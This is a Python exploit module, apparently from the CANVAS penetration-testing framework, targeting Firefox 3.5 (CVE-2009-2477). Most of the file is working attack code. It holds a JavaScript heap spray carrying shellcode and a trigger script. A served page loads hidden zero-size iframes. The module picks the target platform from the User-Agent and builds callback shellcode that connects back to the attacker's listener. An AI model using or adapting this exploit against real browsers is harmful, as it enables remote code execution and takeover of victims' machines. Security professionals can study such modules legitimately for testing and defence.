#! /usr/bin/env python

#
# CANVAS Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys

if "." not in sys.path: sys.path.append(".")

import os,getopt
import socket
from exploitutils import *
from encoder import addencoder
from shellcode import shellcodeGenerator, win32shell
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time

from httpclientside import httpclientside

NAME="Firefox 3.5 Remote Code Execution"
DESCRIPTION="Firefox 3.5 Remote Code Execution"
DOCUMENTATION={}
DOCUMENTATION["VENDOR"]       = "Mozilla"
DOCUMENTATION["Repeatability"]= "One shot"
DOCUMENTATION["CVE Name"]     = "CVE-2009-2477"
DOCUMENTATION["CVE Url"]      = "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-2477"
DOCUMENTATION['CVSS'] = 9.3
DOCUMENTATION["Notes"]        = """Although the advisories states that this due to improper handling of <FONT> and <P> tags, this exploit uses another method to reach the 
vulnerability.  For now - if the target browser is closed then the socket is lost - so you might want to install a MOSDEF service as soon as you can.  This version is not yet
DEP safe."""


VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY            = {}
PROPERTY['TYPE']    = "Exploit"
PROPERTY['SITE']    = "Client Side"
PROPERTY['ARCH']    = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP" ]
PROPERTY['DELIVERY'] = 'HTTP'


NOTES="""
To test from Commandline (it needs fromcreatethread)
   bash-3.00$ ./commandlineInterface.py -v 1 -p 5555
   bash-3.00$ exploits/httpserver/httpserver.py -O singleexploit:firefox_35 -l 192.168.1.1 -p 8080 -d 5555
"""

CHANGELOG="""

"""

DEVNOTES="""
we can control the 0x400000xx address by playing with the sizes and members of searchArray().
we always crash with a value of 0x400000xx so if we can spray upto that 
address we can make sure that "something" is waiting there.  It first needs a valid address to read
then it will call and address that we supplied.


Also - when the javascript is obfuscated - for some reason the javascript breaks ... so for now don't obfuscate until we figure out what the problem is"""
      
class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)

        #self.searchMethod = self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent = [("Mozilla/", "MSIE", ""),("Mozilla/","Linux i686","")]

        self.shellcode="\xcc" * 298
        self.setVersions()
        self.version=1
        self.badstring="\x00\xff"
        self.name=NAME 
        self.filename="index.html"    
        self.listenerArgsDict["fromcreatethread"]=0
        self.obfuscate = False
        self.targetplatform = ""
        self.spraycount    = 1
        
        return


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Windows - all versions",None)

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]


    
    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port

        if self.targetplatform=="Windows":
            
            print "Creating Win32 shellcode"
                      
            self.shellcode = self.createWin32Shellcode(self.badstring,host,port)

        elif self.targetplatform=="Linux":
            
            print "Creating Linux shellcode"
            self.shellcode = self.createLinuxCallbackShellcode(host, port, self.badstring)
        
        return self.shellcode
        
       
    def run(self):
        
        self.log("There are multiple files needed to be served - this exploit is best run from the httpserver module")
        
        return 0
    
    def get_spray(self):
              
        spraycode="""
        <html>
        <script>
        var sc = unescape("SHELLCODE");
        block = unescape("%u4000%u4000");
while (block.length<0x30000)  
{
    block += block;
}
sprayContainer = new Array();
for (i=0; i<100; i++)  
{
    sprayContainer[i] = block + sc;
}
</script>
</html>
""".replace("SHELLCODE",urluencode(self.shellcode)).replace("\t","")
        
       
        if self.obfuscate:
            self.log("Obfuscating javascript code.")
            spraycode    = self.obfuscate_javascript( spraycode )
        
        print spraycode
        return spraycode
    
    
    def get_exploit_javascript(self):
        
        javascript_code = """
<html>
<script>

var searchArray = new Array()

var x;
for (x=0;x<0x400;x++){
searchArray[x+1] = "blah";
searchArray[x+2] = "    ";
searchArray[x+3] = "blah";
searchArray[x+4] = "blah";
searchArray[x+5] = "blah ";
}

function escapeData(data)
{
 var i;
 var c;
 var escData='';
 for(i=0;i<data.length;i++)
  {
   c=data.charAt(i);
   if(c==' ') c = escape(c);
   escData+=c;
  }
 return escData;
}
var html = "";
for (i=1;i<searchArray.length;i++)
{
    html += escapeData(searchArray[i]);
}

</script>
</html>

"""
        
    
        
        if self.obfuscate:
            self.log("Obfuscating javascript code.")
            javascript_code    = self.obfuscate_javascript( javascript_code )            
        
        return javascript_code
        
    def makefile(self):        
        

        filedata = """<html><head><title>Redirecting</title></head><body>"""
        for i in range(12):
            filedata +="""<iframe src="http://%s:%d/s.html" width=0 height=0 style="visibility: hidden; display: none"></iframe>"""%(self.callback.ip, self.port)
        filedata +="""Please wait to be redirected ...</body></html>"""
    
        return filedata
        
        
    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        user_agent  = clientheader.getStrValue(['User-Agent'])
        self.bindip            = self.clientsideargs["bindip"]
        self.port              = self.clientsideargs["bindport"]
        
        if "Mozilla/" and "Windows" in user_agent:
            self.targetplatform="Windows"
            
        elif "Mozilla/" and "Linux" in user_agent:
            self.targetplatform="Linux"
            
        if clientheader.URL.count(self.filename):
            self.shellcode = self.createShellcode()
            sploitstring=self.makefile()
            b.setBody(sploitstring)            
            h.addHeader("Content-Type","text/html")
        
        elif clientheader.URL == "/s.html":
            #funky workaround for making sure that the sprays are loaded into the browser before the 
            #exploit - otherwise we crash due to our code not being in place at the right time
            if self.spraycount <= 11:
                self.log("SERVING s.html for spray (%d/11)"%self.spraycount)
                header=header('SERVER')
                b.setBody(self.get_spray())
                self.spraycount += 1
            else:
                self.log("SERVING s.html for exploit")
                print "pausing to let the sprays complete..."
                time.sleep(5)
                b.setBody(self.get_exploit_javascript())
                self.spraycount=1
                
            h.addHeader("Content-Type","text/html")
            
        else:
            #redirect to self
            self.log("redirecting to self")
            h.status="302"
            h.addHeader("Location",self.filename)
            h.addHeader("Content-Type","text/html")

        return h,b


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
